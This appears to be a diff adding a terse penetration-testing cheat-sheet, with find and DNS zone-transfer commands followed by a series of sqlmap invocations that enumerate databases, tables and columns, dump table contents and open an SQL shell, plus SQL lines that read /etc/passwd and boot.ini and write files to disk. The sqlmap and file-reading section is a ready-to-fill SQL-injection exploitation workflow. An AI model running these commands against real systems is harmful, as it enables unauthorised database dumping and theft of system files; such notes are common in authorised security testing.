@@ -1,0 +1,32 @@
+===============================================================
+=> command find (unix)
+===============================================================
+  - find directory
+    > find / -type d -name "*xxx*"
+  - find text in file in folder
+    > find / -type f -exec grep -H 'xxx' {} \;
+  - find find name in folder
+    > find / -type f -name "*.pdf"
+===============================================================
+=> command host (unix) 
+===============================================================
+  - find text record from DNS
+    > host -t axfr -l domain_com ns_server
+    
+    
+===============================================================
+=> command sqlmap
+===============================================================
+   sqlmap -u "https://xxx" --cookie="xxxx" --data="xxx=xxxx&xxx=xxxx&idparameter=xxx" -p idparameter --dbs
+   sqlmap -u "https://xxx" --cookie="xxxx" --data="xxx=xxxx&xxx=xxxx&idparameter=xxx" --param-del=";" -f --banner --dbs --users
+   sqlmap -u "https://xxx" --cookie="xxxx" --data="xxx=xxxx&xxx=xxxx&idparameter=user=yyyy" -p SQLWHERE --prefix="user=" -f
+   sqlmap -u "https://xxx" --cookie="xxxx" --data="xxx=xxxx&xxx=xxxx&idparameter=user=yyyy" -p SQLWHERE --prefix="user=" --dbs
+   sqlmap -u "https://xxx" --cookie="xxxx" --data="xxx=xxxx&xxx=xxxx&idparameter=user=yyyy" -p SQLWHERE --prefix="user=" -D database_name --tables --risk=3 --level=3
+   sqlmap -u "https://xxx" --cookie="xxxx" --data="xxx=xxxx&xxx=xxxx&idparameter=user=yyyy" -p SQLWHERE --prefix="user=" -D database_name -T table_name --columns
+   sqlmap -u "https://xxx" --cookie="xxxx" --data="xxx=xxxx&xxx=xxxx&idparameter=user=yyyy" -p SQLWHERE --prefix="user=" -D database_name -T table_name --dump
+    > --sql-shell
+    > --sql-shell --technique=S 
+   
+   select load_file ("c:\\boot.ini");
+   select load_file ("/etc/passwd");
+   select "xxx" into outfile "/tmp/xxxxxx"
